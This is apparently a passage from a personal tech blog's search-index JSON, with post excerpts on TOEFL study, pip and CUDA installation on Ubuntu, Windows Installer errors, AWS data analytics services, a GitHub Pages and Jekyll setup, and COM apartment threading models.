TPO 1 Listening Part 1 Section 2","link":"/posts/1543f01a/"},{"title":"淘宝IP地址库接口","text":"$.get('http://ip.taobao.com/service/getIpInfo.php?ip=','json',function(res){ p=JSON.parse(res); p=p.data; for(var key in p){ console.log(key + \" -&gt; \" + p[key]); } })","link":"/posts/76f88d4f/"},{"title":"Essential experience and knowledge obtained from TOEFL preparation","text":"Seize key signals Comparation / Contrast Metaphor / Analogy Emphasis / Intense mood Re-examine the problem when undecided. Opening setences may not indicate the aim, but background info.","link":"/posts/d040ff43/"},{"title":"What if python is pre-installed without pip in Ubuntu?","text":"https://pypi.python.org/pypi/pip wget https://pypi.python.org/packages/11/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-9.0.1.tar.gz#md5=35f01da33009719497f01a4ba69d63c9 tar -xzvf pip-9.0.1.tar.gzcd pip-9.0.1python setup.py install wget https://pypi.python.org/packages/a4/c8/9a7a47f683d54d83f648d37c3e180317f80dc126a304c45dc6663246233a/setuptools-36.5.0.zip#md5=704f500dd55f4bd0be905444f3ba892cunzip setuptools-36.5.0.zipcd setuptools-36.5.0/sudo python setup.py install","link":"/posts/4a302160/"},{"title":"Prepare for deep learning based on GPU with Python","text":"OS: Ubuntu 16.04 Building prerequisities: make build-essential python3-dev Parallel computing prerequisities: cuda8.0 cudnn6.0 export CUDA_HOME=/usr/local/cudaexport PATH=$PATH:/usr/include:/usr/local/cuda/includeexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/lib:/usr/lib/x86_64-linux-gpu/:usr/local/cuda/lib64 Python 3.5 packages: chainer tensorflow-gpu cupy nvidia-cuda-dev is only required when building cupy locally. If python package installation fails, try with sudo pip install --force-reinstall --ignore-installed --no-cache-dir -vvvv to debug.","link":"/posts/3c80b2d4/"},{"title":"GRE is a standardizing form of test","text":"read with understanding read with insight read with discrimination","link":"/posts/929d88de/"},{"title":"《模式识别》课程的难度","text":"这门课程在整个本科CS的课程体系中似乎没有多少地位，但在研究方面是相当有分量的。 然而难以听懂、吸收。 正如葛洪伟老师所言，如果这门课讲述的是喜闻乐见、生动有趣的轶事，普罗大众都可旁听，没有门槛，那么就不能产生足够的价值。这门课必然是枯燥乏味的。","link":"/posts/3ff09e5/"},{"title":"Windows Installer 相关的一些奇葩error的解决","text":"需要保证用户环境变量、系统环境变量中TEMP、TMP所指向的目录均存在。C:\\\\Windows\\\\Installer目录需存在。Windows Installer服务也被启用。 directx sdk error code s1023Uninstall vcredist 2010 x86&amp;x64, install directx sdk and reinstall vcredist 2010 x86&amp;x64. windows installer 临时文件夹已满或不能访问Check C:\\\\Windows\\\\Installer with permissons guaranteed. ` windows installer error code 2503/2502Check the permissions of C:\\WINDOWS\\TEMP","link":"/posts/cdb20dac/"},{"title":"电信运营商怎样劫持http并植入百毒广告","text":"","link":"/posts/79b0ea12/"},{"title":"2017从板绘到屏绘","text":"","link":"/posts/a68db16a/"},{"title":"自动草稿","text":"","link":"/posts/a16f8366/"},{"title":"Data Analytics from the Perspective of AWS","text":"Data Analytics at a GlanceAnalysis is a detailed examination of something in order to understand its nature or determine its essential features. Data analysis is the process of compiling, processing, and analyzing data so that you can use it to make decisions. Analytics is the systematic analysis of data. Data analytics is the specific analytical process being applied. Data analysis solutions, which are broader than big data solutions, are made up of gathering, storing, processing, and visualizing data. The challenges identified in many data analysis solutions can be summarized by five key challenges: volume, velocity, variety, veracity, and value. Structured vs Semi-structured vs Unstructured data Structured data is organized and stored in the form of values that are grouped into rows and columns of a table. Commonly stored in relational databases. Semi-structured data is often stored in a series of key-value pairs that are grouped into elements within a file. Often stored in NoSQL databases or CSV, XML or JSON files. Unstructured data is not structured in a consistent way. Some data may have structure similar to semi-structured data but others may only contain metadata. Often takes the form of files or objects. Volume – data storageWhen businesses have more data than they are able to process and analyze, they have a volume problem. Amazon S3scalable, durable object storage; decoupling storage from processing; parallelization; centralized, accessible and avoid moving between systems. Other S3 benefits: Store anything; Secure object storage; Natively online, HTTP access; 99.999999999% durability An object is composed of a file and any metadata that describes that file.Buckets are logical containers for objects.An object key is the unique identifier for an object in a bucket.Think of Amazon S3 as a basic data map between “bucket + key + version” and the object itself. Data LakeA data lake is a centralized repository that allows you to store structured, semistructured, and unstructured data at any scale, through a single set of tools. Traditional data storage and analytic tools can no longer provide the agility and flexibility required to deliver relevant business insights. That’s why many organizations are shifting to a data lake architecture. Benefits of data lake: By using data lakes, you can break down data silos and bring data into a single, central repository that is managed by a single team. That gives you a single, consistent source of truth. Store any type of data regardless of structure. Leave that pre-processing to the system that processes it, rather than the system that stores it. Can still be analyzed using ETL, AI and ML. Benefits of AWS data lake: cost-effective data storage; security and compliance; take advantage of many different data collection and ingestion tools; categorize and manage your data; turn data into meaningful insights. Feature: Collect and store any type of data, at any scale, and at low cost Secure the data and prevent unauthorized access Catalog, search, and find the relevant data in the central repository Quickly and easily perform new types of data analysis Use a broad set of analytic engines for one-time analytics, real-time streaming, predictive analytics, AI, and machine learning Open source distributed processing frameworks, such as those supported by Amazon EMR. Apache Hadoop and Spark are both supported by Amazon EMR. “Data scientists spend 60% of their time cleaning and organizing data and 19% collecting data sets. “Data preparation is a huge undertaking. Data WarehouseA data warehouse is a central repository of structured data from many data sources. This data is transformed, aggregated, and prepared for business reporting and analysis before it is loaded. A subset of data from a data warehouse is called a data mart. Data marts only focus on one subject or functional area. A warehouse might contain all relevant sources for an enterprise, but a data mart might store only a single department’s sources. Because data marts are generally a copy of data already contained in a data warehouse, they are often fast and simple to implement. Characteristics Data warehouse Data lake Data Relational from transactional systems, operational databases, and line of business applications Non-relational and relational from IoT devices, websites, mobile apps, social media, and corporate applications Schema Designed prior to implementation (schema-on-write); Written at the time of analysis (schema-on-read) Price/ performance|Fastest query results using higher cost storage|Query results getting faster using low-cost storage||Data quality|Highly curated data that serves as the central version of the truth|Any data, which may or may not be curated (e.g., raw data)||Users|Business analysts|Data scientists, data developers, and business analysts (using curated data)||Analytics|Batch reporting, BI, and visualizations|Machine learning, predictive analytics, data discovery, and profiling.| Amazon RedshiftAmazon Redshift lets you set up and deploy a new data warehouse in minutes. Recommended storing massive amounts of structured data for complex analysis. It’s built to store and query datasets ranging from gigabytes to petabytes in size. Scalable and 10x performance vs traditional ones. Benefits of Amazon Redshift Faster performance 10x faster than other data warehouses Easy to set up, deploy, and manage Secure Scales quickly to meet your needs Traditional data warehousing: pros and cons|Pros |Cons||—|—||Fast data retrieval |Costly to implement||Curated data sets |Maintenance can be challenging||Centralized storage |Security concerns||Better business intelligence |Hard to scale to meet demand| Amazon Redshift Spectrum allows you to combine your data lake and data warehouse as if it were a single source of data. it’s possible to execute a single query against exabytes of data! a tool for creating ETL operations called Amazon EMR. Amazon EMR is a managed Hadoop framework. Hadoop supports rapid data transfers, which means you can speed up the processing time for complex queries. Whether you use Hadoop on-premises or Amazon EMR, you will use the same tools, with one major exception: Amazon EMR uses its own file system. And that means you can use your Amazon S3 data lake as the data store. Data storage on a BIG scale When storing individual objects or files, we recommend Amazon S3. When storing massive volumes of data, both semistructured and unstructured, we recommend building a data lake on Amazon S3. When storing massive amounts of structured data for complex analysis, we recommend storing your data in Amazon Redshift. Apache HadoopHadoop uses a distributed processing architecture, in which a task is mapped to a cluster of commodity servers for processing. Each piece of work distributed to the cluster servers can be run or re-run on any of the servers. The cluster servers frequently use the Hadoop Distributed File System (HDFS) to store data locally for processing. The results of the computation performed by those servers are then reduced to a single output set. One node, designated as the master node, controls the distribution of tasks and can automatically handle server failures. Hadoop clusters provide extremely fast and reliable ingestion and processing of data. Amazon EMR provides an alternative to HDFS: the EMR File System (EMRFS). Velocity – data processingWhen businesses need rapid insights from the data they are collecting, but the systems in place simply cannot meet the need, there’s a velocity problem. Batch processing means processing content in batches. process it at certain intervals—for example, on a schedule or when you reach a certain volume of data. This kind of processing is performed on datasets like server logs, financial data, fraud reports, and clickstream summaries. Batch processing comes in two forms: scheduled (regular predictable massive burst at once) and periodic (irregular unpredictable tremendous workloads). Stream processing means processing data in a stream. processing data that’s generated continuously, in small datasets (measured in kilobytes) for real-time feedback or continuous insights. This kind of processing is performed on datasets like IoT sensor data, e-commerce purchases, in-game player activity, clickstreams, or information from social networks. Stream processing also comes in two forms: real time (very small individual batches in ms) and near-real time (small individual batches in min) Stream processing is used to get initial insights and real-time feedback, while batch processing is used to get deep insights from complex analytics. In stream processing, Amazon Kinesis Data Analytics allows you to choose to query a rolling time window of data, say the last two minutes. The analysis is limited to only those records collected within that window of time. Because of this limitation, analytics on streaming data are often simple aggregates. Attributes of batch and stream processing The table below highlights the difference between batch and stream processing: Batch data processing Stream data processing Data scope Queries or processing over all or most of the data in the dataset Queries or processing over data within a rolling time window, or on just the most recent data record Data size Large batches of data Individual records or micro batches consisting of a few records Latency Minutes to hours Seconds or milliseconds Analysis Complex analytics Simple response functions, aggregates, and rolling metrics The more complex definition is that batch processing is the execution of a series of programs, or jobs, on one or more computers without manual intervention. Amazon EMRAmazon EMR is a managed service for executing highly complex, massive batch workloads. This service also allows highly complex analytic operations. It provides managed Hadoop framework. Amazon EMR has mitigated this problem (collection systems and processing systems are out of balance) by decoupling the collection system from the processing system. Both Hadoop and Spark support general batch processing, streaming analytics, machine learning, graph databases, and ad hoc queries. The difference is that Spark uses in-memory caching and optimized execution for faster performance. Analytics are performed by first filtering the data and then aggregating it. avoids writing data to storage. AWS GlueAWS Glue is a fully managed ETL service that categorizes, cleans, enriches, and moves your data reliably between various data stores, which makes it easy to prepare and load your data for analytics. AWS Glue simplifies and automates difficult and time-consuming data discovery, conversion, mapping, and job-scheduling tasks. In other words, it simplifies data processing. In addition to running the Apache Hadoop framework, you can also run other popular distributed frameworks such as Apache Spark, HBase, Presto, and Flink in EMR. AWS LambdaAWS Lambda is a serverless compute service that can be used to trigger processing operations in a batch processing system. Amazon Redshift is a managed, fast, scalable data warehouse service that stores large amounts of transactional data for the purpose of analytics. With streaming data solutions, the default is to decouple the collection system, called the producer, from the processing system, called the consumer. The streaming solution provides a persistent buffer for your incoming data. Second, each of the stream producers can write their data to the same endpoint。 Third is the ability to preserve the ordering of data. AWS KinesisKinesis makes it easy to collect, process, and analyze real-time, streaming data so you can get timely insights and react quickly to new information. There are many reasons to use streaming data solutions. In a batch processing system, processing is always asynchronous, and the collection system and processing system are often grouped together. With streaming solutions, the collection system (producer) and the processing system (consumer) are always separate (decoupled). Streaming data uses what are called data producers. Each of these producers can write their data to the same endpoint, allowing multiple streams of data to be combined into a single stream for processing. Another huge advantage is the ability to preserve client ordering of data and the ability to perform parallel consumption of data. This allows multiple users to work simultaneously on the same data. Parellelization in collecting and consuming data. Amazon Kinesis Data Firehose is the easiest way to capture, transform, and load data streams into AWS data stores for near real-time analytics with existing business intelligence tools. Amazon Kinesis Data Streams enables you to build custom, real-time applications that process data streams using popular stream processing frameworks. Amazon Kinesis Data Analytics is the easiest way to process data streams in real time with SQL or Java without having to learn new programming languages or processing frameworks. Amazon Kinesis Video Streams makes it easy to securely stream video from connected devices to AWS for analytics, machine learning (ML), and other processing. Amazon Athena is an interactive query service that makes it easy to analyze data in Amazon S3 using standard SQL. Athena is serverless, so there is no infrastructure to manage, and you pay only for the queries that you run. Amazon QuickSight is a fast, cloud-powered business intelligence (BI) service that makes it easy for you to deliver insights to everyone in your organization. Variety – data structure and typesWhen your business becomes overwhelmed by the sheer number of data sources to analyze and you cannot find systems to perform the analytics, you know you have a variety problem. Data Variety is not about data types but about how data types are organized. Structured data is hot, immediately ready to be analyzed.Semistructured data is lukewarm—some data will be ready to go and other data may need to be cleansed or preprocessed. Unstructured data is the frozen ocean—full of exactly what you need but separated by all kinds of stuff you don’t need. OLTP vs OLAPthere are two primary information systems or methods for organizing information: online transaction processing, or OLTP, and online analytical processing, or OLAP. Online transaction processing (OLTP) databases, often called operational databases, logically organize data into tables with the primary focus being on the speed of data entry. These databases are characterized by a large number of insert, update, and delete operations.All decisions about the organization of data and storage of attributes is based on ensuring rapid data entry and updates. The effectiveness of an OLTP system is often measured by the number of transactions per second. Online analytical processing (OLAP) databases, often called data warehouses, logically organize data into tables with the primary focus being the speed of data retrieval through queries. These databases are characterized by a relatively low number of write operations and the lack of update and delete operations.All decisions about the organization of data and storage of attributes are based on the types of queries and other analytics that will be performed using the data. The effectiveness of an OLAP system is often measured by the response time of query results. Characteristic OLTP OLAP Nature Constant transactions (queries/updates) Periodic large updates, complex queries Examples Accounting database, online retail transactions Reporting, decision support Type Operational data Consolidated data Data retention Short-term (2-6 months) Long-term (2-5 years) Storage Gigabytes (GB) Terabytes (TB)/petabytes (PB) Users Many Few Protection Robust, constant data protection and fault tolerance Periodic protection In an OLTP system, the most common queries are called lookup queries. These queries need to return several columns of data for each matching record. The filters on this data are generally based on the key columns in that table. In this type of system, you might query to get details for a specific order. In an OLAP system, the most common queries are aggregate queries. These queries take large numbers of rows and reduce them to a single row by aggregating the values in one or more columns. In this type of system, you might query to find out the total number of items sold on a specific date. Row-based indexes Columnar indexes Storage on disk Row by row Column by column Read/write Best at random reads and writes Best at sequential reads and writes Best for Returning full rows of data based on a key Returning aggregations of column values Implementation Transactional systems Analytical processing Data compression Low to medium compression can be achieved High compression is the norm Veracity – cleansing and transformationWhen you have data that is ungoverned, coming from numerous, dissimilar systems and cannot curate the data in meaningful ways, you know you have a veracity problem.Data veracity is contingent on the integrity of the data. Data cleansing is the process of detecting and correcting corruptions within data. Referential integrity is the process of ensuring that the constraints of table relationships are enforced. Domain integrity is the process of ensuring that the data being entered into a field matches the data type defined for that field. Entity integrity is the process of ensuring that the values stored within a field match the constraints defined for that field. The share stage is where consumers gain access to the data in the form of reports. Most consumers will have a good idea of what the numbers should be. If consumers do not see what they expect, they will question the validity of the data. Relational integrity ensures that both members of a relationship remain consistent. Entity integrity ensures that values within a field remain consistent. An information schema is a database of metadata containing information on all database objects. A logical schema lists the constraints, relationships, and properties of tables and views in a database. ACID compliance BASE compliance Strong consistency Weak consistency – stale data is OK Isolation is key Availability is key Focus on committed results Best effort results Conservative (pessimistic) availability Aggressive (optimistic) availability When the consistency of changes across all instances is my primary concern, ACID compliance is the proper method for compliance enforcement. When data is being generated in a highly active environment and availability is my primary concern, BASE compliance is the proper method for compliance enforcement. Your data analysis solution requires a process to gather, transform, and move data into a new analytical data store.ETL operations allow you to ensure that your data has the accuracy, precision, and depth you need to properly analyze the data and produce a complete data narrative through reports and dashboards.","link":"/posts/541fef6d/"},{"title":"使用github+jekyll搭建blog环境，完美替代wordpress-前端随记","text":"使用github+jekyll搭建blog环境，完美替代wordpress-前端随记-黑妞哈哈. 也来讲讲怎么使用github pages做blog环境 优点 空间免费，github托管，稳定又安全，遭遇过空间商跑路的朋友是不是想起伤心往事；允许本地服务器调试，脱离网络写文章毫无压力，因为可以使用git命令同步来管理文章，版本控制妥妥的，对技术人员来说，一键恢复，实在是神物；还能绑定顶级域名，亲，人家免费空间竟然还允许我们绑域名有木有~~；文章用markedown编写，以前遭受排版困扰的亲们是不是很激动；购买域名（略） 用免费的dnsPod做域名解析 dnspod链接地址https://www.dnspod.cn/ github注册和本地电脑jekyll等环境配置 参考最底下的参考文章，省略。。。 命令 git命令获取远程文件 git clone git@github.com:heiniuhaha/heiniuhaha.github.com.git 定位到目录heiniu.github.com cd .ssh/heiniuhaha.github.com 使用rake命令 rake page # Create a new page.rake post # Begin a new post in ./_postsrake preview # Launch preview environment 写文章的时候学习下markdown语法 如:中文单引号 ` 用来标注小块代码,如github jekyll 最后提交git代码 git add .git commit . -m ‘just another commit’ 日常发布完整命令 git clone git@github.com:heiniuhaha/heiniuhaha.github.com.git//本地如果无远程代码，先做这步，不然就忽略cd .ssh/heiniuhaha.github.com//定位到你blog的目录下git pull origin master //先同步远程文件，后面的参数会自动连接你远程的文件git status //查看本地自己修改了多少文件git add .//添加远程不存在的git文件git commit * -m “what I want told to someone”git push origin master //更新到远程服务器上 参考文章 搭建一个免费的，无限流量的Blog—-github Pages和Jekyll入门 阮一峰写于2012-08-25 【推荐】 使用Github Pages建独立博客 使用github作为博客引擎 The Quickest Way to Blog with Jekyll. 附件：git api 总结图","link":"/posts/8d0316dd/"},{"title":"【Visual Studio】Windows窗体应用程序代码中的【STAThreadAttribute】是什么?","text":"出处:[code lang=”cpp”]// WinForm.cpp: 主项目文件。 #include &quot;stdafx.h&quot; #include &quot;Form1.h&quot; using namespace WinForm; [STAThreadAttribute]int main(array&lt;System::String ^&gt; ^args){ // 在创建任何控件之前启用 Windows XP 可视化效果 Application::EnableVisualStyles(); Application::SetCompatibleTextRenderingDefault(false); // 创建主窗口并运行它 Application::Run(gcnew Form1()); return 0; }[/code] 引用:COM线程模型详解 线程模型是一种数学模型，专门针对多线程编程而提供的算法，但也仅是算法，不是实现。本文讲解COM提出的各个类型的线程模型，再说明COM运行时期库是如何实现它们的，就像说明Windows是如何实现线程这个数学模型的一样，最后指明一下跨套间调用和各种类型套间编写的要求以帮助理解。希望读者对于Windows操作系统的线程这个概念相当熟悉，对何谓“线程安全的”亦非常了解。 COM线程模型 COM提供的线程模型共有三种：Single-Threaded Apartment（STA 单线程套间）、Multithreaded Apartment（MTA 多线程套间）和Neutral Apartment/Thread Neutral Apartment/Neutral Threaded Apartment（NA/TNA/NTA 中立线程套间，由COM+提供）。虽然它们的名字都含有套间这个词，这只是COM运行时期库（注意，不是COM规范，以下简称COM）使用套间技术来实现前面的三种线程模型，应注意套间和线程模型不是同一个概念。COM提供的套间共有三种，分别一一对应。而线程模型的存在就是线程规则的不同导致的，而所谓的线程规则就只有两个：代码是线程安全的或不安全的，即代码访问公共数据时会或不会发生访问冲突。由于线程模型只是个模型，概念上的，因此可以违背它，不过就不能获得COM提供的自动同步调用及兼容等好处了。 STA 一个对象只能由一个线程访问（通过对象的接口指针调用其方法），其他线程不得访问这个对象，因此对于这个对象的所有调用都是同步了的，对象的状态（也就是对象的成员变量的值）肯定是正确变化的，不会出现线程访问冲突而导致对象状态错误。其他线程要访问这个对象，必须等待，直到那个唯一的线程空闲时才能调用对象。注意：这只是要求、希望、协议，实际是否做到是由COM决定的。如上所说，这个模型很像Windows提供的窗口消息运行机制，因此这个线程模型非常适合于拥有界面的组件，像ActiveX控件、OLE文档服务器等，都应该使用STA的套间。 MTA 一个对象可以被多个线程访问，即这个对象的代码在自己的方法中实现了线程保护，保证可以正确改变自己的状态。这对于作为业务逻辑组件或干后台服务的组件非常适合。因为作为一个分布式的服务器，同一时间可能有几千条服务请求到达，如果排队进行调用，那么将是不能想像的。注意：这也只是一个要求、希望、协议而已。 NA 一个对象可以被任何线程访问，与MTA不同的是任何线程，而且当跨套间访问时（后面说明），它的调用费用（耗费的CPU时间及资源）要少得多。这准确的说都已经不能算是线程模型了，它是结合套间的具体实现而提出的要求，它和MTA不同的是COM的实现方式而已。 COM套间 Apartment被翻译成套间或是单元，是线程模型的一个实现者，就像在操作系统课程中讲到的线程只是一个数学模型，而Windows的线程、进程是它（数学模型的线程、进程）的实现者。套间只是逻辑上的一个概念，实现时只是一个结构（由COM管理）而已，记录着相关信息，如它的种类（只能是上面那三个，至少现在是），并由COM根据那个结构进行相应的处理。下面说明这三种套间的实现方式： STA套间 一个套间如果是STA，那么那个套间有且只有一个线程和其关联，有多个对象或没有对象和其关联，就像有多个线程和一个进程关联一样，也就是说套间那个结构和某个线程及多个对象之间有关系，关系具体是什么由COM说得算，幸运的是COM正是按照上面的线程模型来定义互相之间关系的。根据上面的算法，很容易就知道只有这个线程可以访问这个套间里的对象。 COM是通过在STA套间里的线程中创建一个隐藏窗口，然后外界（这个套间外的线程）对这个对象的调用都转变成对那个隐藏窗口发送消息，然后由这个隐藏窗口的消息处理函数来实际调用组件对象的方法来实现STA的规则的。之所以使用一个隐藏窗口是为了方便组件代码的编写——只需调用DispatchMessage即可将方法调用的消息和普通的消息区分开来（通过隐藏窗口的消息处理函数）。外界对这个对象的调用都将转变成对这个隐藏窗口的消息发送来实现同步。至于COM如何截获外界对对象的调用，则是利于代理对象，后面再说明。 值得注意的是，如果使用标准汇集法生成代理对象，则代理对象会根据是进程内还是进程外的跨套间调用，来决定具体操作。如果外界线程和STA线程在同一进程内，则代理对象将直接向STA线程中的隐藏窗口发送消息；如果不在同一进程内（包括远程进程），代理对象将向RPC管理的一个线程池请求一个线程（RPC线程）来专门向另一进程中的STA线程的隐藏窗口发送消息，而不是代理对象直接发送消息，以防止外界线程由于网络等不稳定因素而导致挂起。 因为COM利用消息机制来实现STA，因此STA套间里的线程必须实现消息循环，否则COM将不能实现STA的要求。 MTA套间 这种类型的套间可以和多个线程及多个或没有对象相关联。根据上面的MTA模型，可知只有这个套间里的线程才能访问这个套间里的对象，和STA不同的只是可以多个线程同时访问对象。 外界（不属于这个套间的线程）对这个套间里的对象的调用将会导致调用线程（外界线程，也就是STA线程，因为NA没有线程）挂起，然后向RPC管理的一个线程池请求一个线程（RPC线程，并已经进入了这个MTA套间）以调用那个对象的方法。对象返回后，调用线程被唤醒，继续运行。虽然可以让STA线程直接调用对象（而不用像前述的挂起等待另一个线程来调用对象），但这是必须的，因为可能会有回调问题，比如这个MTA线程又反过来回调外界线程中的组件对象（假设客户本身也是一个组件对象，这正是连接点技术），如果异步回调将可能发生错误。 反过来，MTA的线程访问STA里的对象时，COM将把调用转换成对STA线程里那个隐藏窗口的一个消息发送，返回后再由COM转成结果返回给MTA的线程（如果使用标准汇集法生成标准代理对象，则发生的具体情况就如上面STA套间所述）。因此STA和MTA都是只能由它们关联的线程调用它们关联的对象。而根据上面所说，当MTA调STA或STA调MTA，都会发生线程切换，也就是说一个线程挂起而换成执行另一个线程。这是相当大的消耗（需要从内核模式向用户模式转换，再倒转好几回），而NA就是针对这个设计的。 NA套间 这种套间只和对象相关联，没有关联的线程，因此任何线程都可以直接访问里面的对象，不存在STA的还是MTA的。 外界（其实就是任何线程）对这个套间里面的调用都不需要挂起等待，而是进入NA套间，直接调用对象的方法。NA套间是由COM+提供的，COM+中的每个对象都有一个环境和其相绑定，环境记录了必要的信息，并监听对对象的每一次调用，以保证当将对象的接口指针成员变量进行传递或回调时其操作的正确性（保证执行线程在正确的套间内，MTA线程就是通过将自己挂起以等待STA线程的消息处理完毕来保证的），从而避免了调用线程的挂起，因此这个代理（其实也就是环境的一部分）被称作轻量级代理（相对于STA套间和MTA套间的重量级代理——需要挂起调用线程，发生线程切换）。 这个轻量级代理并不是永远都不发生线程切换。当NA对象里有个对指向一个STA对象的指针的调用而调用线程不是那个STA对象关联的线程时，调用将会转成向被调用的STA对象的关联线程发送消息，此时照样会发生线程切换。同理，如果那个对象是MTA的，而调用线程是STA线程时，依旧发生线程切换。不过除此以外的大多数情况（即不在NA对象的方法中调用另一个套间对象的方法）都不会发生线程切换，即使出现上面的情况也只有必要（MTA调NA再调MTA就不用切换）才切换线程。 根据上面所说，STA其实和MTA逻辑上是完全一样的，只是一个是关联一个线程，一个是关联多个线程而已。但把它们分开是必要的，因为线程安全就是针对是一个线程还是多个线程。而NA之所以不关联线程是因为它的目的是消除上面跨套间调用时产生的线程切换损耗，关联线程没有任何意义。 COM强行规定（不遵守也没辙，因为全是COM实现套间的，根本没有插手的余地）一个进程可以拥有多个STA的套间，但只能拥有一个MTA套间和一个NA套间，我想这应该已经很容易理解了（要两个MTA套间或NA套间干甚？）。 套间生成规则 线程在进行大多数COM操作之前，需要先调用CoInitialize或CoInitializeEx。调用CoInitialize告诉COM生成一个STA套间，并将当前的调用线程和这个套间相关联。而调用CoInitializeEx( NULL, COINIT_MULTITHREADED );告诉COM检查是否已经有了一个MTA套间，没有则生成一个MTA套间，然后将那个套间和调用线程相关联。接着在调用CoCreateInstance或CoGetClassObject等创建对象的函数时，创建的对象将以一个特定规则决定和哪个套间相关联（后叙）。这样完成后，就完成了线程、对象和套间的关联（或绑定）。 前面提到的决定对象去向的规则如下。 当是进程内组件时，根据注册表项InprocServer32ThreadingModel和线程的不同，列于下表： 创建线程关联的套间种类ThreadingModel键值组件对象最后所在套间STAApartment创建线程的套间STAFree进程内的MTA套间STABoth创建线程的套间STA“”或Single进程内的主STA套间STANeutral进程内的NA套间MTAApartment新建的一个STA套间MTAFree进程内的MTA套间MTAFree进程内的MTA套间MTABoth进程内的MTA套间MTA“”或Single进程内的主STA套间MTANeutral进程内的NA套间 进程内的主STA套间是进程中第一个调用CoInitialize的线程所关联的套间（即进程中的第一个STA套间）。后面说明为什么还来个进程内的主STA套间。 当是进程外组件时，由主函数调用CoInitializeEx或CoInitialize指定组件所在套间，与上面的相同，CoInitialize代表STA，CoInitializeEx( NULL, COINIT_MULTITHREADED );代表MTA，没有NA。因为NA是COM+提供的，而COM+服务只能提供给进程内服务器，因此只使用上面的注册表项的规则决定DLL组件是否放进NA套间，而没有提供类似CoInitializeEx( NULL, COINIT_NEUTRAL );来处理EXE组件。而且如果可以使用CoInitializeEx( NULL, COINIT_NEUTRAL );将导致调用线程和NA套间相关联了，违背了NA的线程模型，这也是为什么ThreadingModel键在InprocServer32键下。 跨套间调用 STA线程1创建了一个STA对象，得到接口指针IABCD，接着它发起STA线程2，并且将IABCD作为线程参数传入。在线程2中，调用IABCD::Abc()方法，成功或者失败天注定。由于线程2所在的STA套间不同于线程1所在的STA套间，这样线程2就跨套间调用另一个套间的对象了。按照前述的STA规则，IABCD::Abc()应该被转成消息来发送，而如果如上面做法，可以，编译通过，不过运行就不保证了。 COM之所以能够实现前面所说的那些规则（STA、MTA、NA），是因为跨套间调用时，被调用的对象指针是指向一个代理对象，不是组件对象本身。而那个代理对象实现前述的那三个实现算法（转成消息发送，线程切换等），而一般所说的代理/占位对象（Proxy/Stub）等其实都只是指进行汇集工作的代码（后述）。而按照上面直接通过线程参数传入的指针是直接指向对象的，所以将不能实现STA规则，为此COM提供了如下两个函数（还有其他方式，如通过全局接口表GIT）来方便产生代理：CoMarshalInterface和CoUnmarshalInterface（如果在同一进程内的线程间传递接口指针，则可以通过这两个函数来进一步简化代码的编写：CoMarshalInterThreadInterfaceInStream和CoGetInterfaceAndReleaseStream）。现在重写上面代码，线程1得到IABCD后，调用CoMarshalInterface得到一个IStream，然后将IStream传入线程2，在线程2中，调用CoUnmarshalInterface得到IABCD，现在这个IABCD*就是指向代理对象的，而不是组件对象了。 因此，前面所说过的所有线程模型的算法都是通过代理对象实现的。要跨套间时，使用CoMarshalInterface将代理对象的CLSID和其与组件对象建立联系的一些必要信息（如组件对象的接口指针）列集（Marshaling）到一个IStream中，再通过任何线程间通信手段（如全局变量等）将IStream传到要使用的线程中，再用CoUnmarshalInterface散集（Unmarshaling）出接口以获得指向代理对象的接口指针。因此之所以要获得代理对象的指针是因为想使用COM提供的线程模型（但在COM+中，这不是唯一的理由），如果不想使用大可不必这么麻烦（不过后果自负），并没有强制要求必须那么做。 当线程1和线程2都是MTA时，则可以像最开始说的那样，直接传递IABCD*到线程2中，因为MTA线程模型同意多个线程同时直接调用对象，线程1和线程2在同一个MTA套间中，而那个对象通过某种形式（如ThreadingModel = Free）向COM声明了自己支持MTA线程模型。 而当a.exe的线程1和b.exe的线程2都是MTA时，则依旧需要像上面那样进行接口指针的汇集（列集→传输→散集这个过程）以得到指向代理而非对象的指针，即使线程1和线程2都是在MTA套间中，却是在两个不同的MTA套间中，因此是跨套间调用，需要汇集操作。 汇集代码 前面已经说明了套间的规则都是通过对代理对象而非组件对象发起调用以截取对组件对象的调用由代理对象来实现的。代理对象要和组件对象交互，将方法参数传递给组件对象，需要使用到汇集技术，也就是列集→传输→散集这个过程。 列集（Marshaling）指将信息以某种格式存为流（IStream*）形式的操作；散集（Unmarshaling）则是列集的反操作，将信息从流形式中反还出来；传输则只是流形式的传递操作。 这里经常发生误会。前面的CoMarshalInterface所做的列集，是将代理对象的CLSID及一些持久信息（用于初始化代理对象）格式化为一种格式（网络数据描述——Network Data Representation）后放到一个流对象中，可以通过网络（或其他方式）将这个流对象传递到客户机，由客户通过CoUnmarshalInterface从传来的流对象中反还出代理对象的CLSID和初始化用的一些持久信息，生成代理对象并使用持久信息初始化它以用于汇集操作。这就是发生误会的地方——这里的汇集操作不同于上面的汇集操作，其汇集的是接口方法的参数而不是什么CLSID和一些初始化信息。 因此CoMarshalInterface和CoUnmarshalInterface是用于汇集接口指针的，再准确点应该是用于生成代理对象的。代理对象应由读者自己实现，用于汇集接口方法的参数。一般有两种代理对象的实现方式：自定义汇集和标准汇集。 对于自定义汇集，组件需实现IMarshal接口和一个代理组件（即完全实现真正组件所有接口的一个副本，实现了汇集方法参数及线程模型的规则，也必须实现IMarshal接口），并将这个代理组件在客户机上注册，以保证代理对象的正确生成。注意：如果参数中有接口指针，必须用CoMarshalInterface和CoUnmarshalInterface进行汇集，否则无法实现正确的线程模型，且代理组件是线程模型的实现者，这点组件必须自己保证（如发送消息等）。 对于标准汇集，组件无需实现IMarshal接口及代理组件，代替的，组件则需要为自己生成一个代理/占位组件（Proxy/Stub），其由于可通过MIDL由IDL文件自动生成，效率高，代码的正确性有保证，因而被鼓励使用。COM提供了一个标准代理对象的实现，其通过聚合组件的代理/占位组件以表现出其好像是组件的代理对象。与自定义汇集一样，需要将这个代理/占位组件在客户机上注册以保证代理对象的正确生成。 至于这两种汇集的具体工作机理，由于与本文无关，在此不表，这里仅仅只为消除代理对象和代理/占位组件之间的混淆。 注意：对于将运行于NA套间的组件，由于COM+的强制要求，其必须使用标准汇集进行代理对象的生成而不是自定义汇集（COM+运行时期库重写了标准代理对象来截获对组件对象的调用和其自身的某些特殊处理——如保证NA套间正确工作）。 套间实现规则 如前面所说，COM的套间机制要成功，必须服务器（组件）、客户和COM运行时期库三方面合力实现，其中有任何一方不按着规矩来，将不能实现套间机制的功能，不过这并不代表什么错误，套间机制不能运作并不代表程序会崩溃，只是不能和其他COM应用兼容而已。 